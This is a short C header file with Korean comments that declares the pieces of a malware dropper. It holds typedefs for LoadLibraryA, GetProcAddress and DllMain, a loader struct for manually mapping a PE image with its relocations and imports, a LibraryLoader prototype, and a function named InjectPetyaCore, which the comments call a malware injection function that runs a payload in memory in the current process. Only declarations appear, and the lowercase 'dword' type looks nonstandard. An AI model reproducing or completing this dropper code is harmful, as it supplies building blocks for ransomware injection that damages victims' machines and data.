#pragma once
#include <TlHelp32.h>

// 드로퍼 코드에 사용되는 함수와 구조체를 정의하는 헤더 파일

// 동적으로 라이브러리를 로드하는 LoadLibraryA 함수의 포인터 정의
typedef HMODULE(__stdcall* pLoadLibraryA)(LPCSTR);

// 동적으로 함수 주소를 가져오는 GetProcAddress 함수의 포인터 정의
typedef FARPROC(__stdcall* pGetProcAddress)(HMODULE, LPCSTR);

// DLL의 진입점(DllMain)에 해당하는 함수 포인터 정의
typedef INT(__stdcall* dllmain)(HMODULE, DWORD, LPVOID);

// 메모리 로더 및 인젝션 데이터 구조체 정의
typedef struct loaderdata
{
    LPVOID ImageBase;                              // PE 파일의 메모리 기본 주소
    PIMAGE_NT_HEADERS NtHeaders;                  // PE 파일의 NT 헤더 구조체
    PIMAGE_BASE_RELOCATION BaseReloc;             // 주소 재배치(Relocation) 테이블
    PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;     // 임포트 테이블

    pLoadLibraryA fnLoadLibraryA;                 // LoadLibraryA 함수 포인터
    pGetProcAddress fnGetProcAddress;             // GetProcAddress 함수 포인터

} loaderdata;

// 자리표시자(Stub) 함수
dword __stdcall stub();
// PE 파일 로딩을 위한 자리표시자 함수로, 기능 구현 없이 호출 위치를 확인하기 위해 사용됨

// PE 파일 로더 함수
dword __stdcall LibraryLoader(LPVOID Memory);
// PE 파일을 메모리에 로드하고 임포트 테이블을 처리하며 재배치를 수행하는 기능을 담당

// 악성코드 인젝션 함수
void InjectPetyaCore();
// PE 파일을 메모리로 직접 로드하고 실행하도록 설정하며, 현재 프로세스에 직접 인젝션을 수행
